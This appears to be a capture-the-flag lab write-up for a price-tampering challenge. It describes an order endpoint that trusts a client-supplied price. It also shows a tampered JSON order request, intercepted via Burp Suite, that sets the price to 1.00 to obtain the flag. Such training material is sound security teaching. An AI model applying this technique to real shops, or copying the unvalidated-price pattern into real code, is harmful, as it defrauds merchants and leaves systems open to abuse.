# Level 1 — Price Tampering

## Challenge Description

This challenge simulates a product purchase feature where the order API accepts the price parameter from the frontend without validating it against the database. When the submitted price is lower than the actual price, the Flag is returned.

**Objective**: Modify the price parameter in the order request to purchase at a lower price and capture the Flag.

## Vulnerability Analysis

### Code Logic

Backend code: `PriceTamperController.java`

```
GET  /api/challenge/biz-logic/price/products  — Get product list
POST /api/challenge/biz-logic/price/order      — Place order
```

**Vulnerability**: The `price` field comes from the request body. The server does not validate that the submitted price matches the database price. It directly uses the submitted price for order calculation.

### Source Code Snippet

```java
Double actualPrice = ((Number) targetProduct.get("price")).doubleValue();
if (submittedPrice < actualPrice) {
    String flag = flagService.getFlag("business-logic", "level1");
    result.put("paidPrice", submittedPrice);
    result.put("flag", flag);
}
```

## Walkthrough

### Step 1: View Products

```
GET /api/challenge/biz-logic/price/products
```

### Step 2: Place Order with Tampered Price

Use Burp Suite to intercept and modify the price:

```json
POST /api/challenge/biz-logic/price/order
{
  "productId": 1,
  "price": 1.00,
  "quantity": 1
}
```

### Step 3: Capture the Flag

The response contains the Flag when price tampering is successful.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/businesslogic/PriceTamperController.java` | Backend order endpoint |
| `service/FlagService.java` | Flag retrieval and validation |
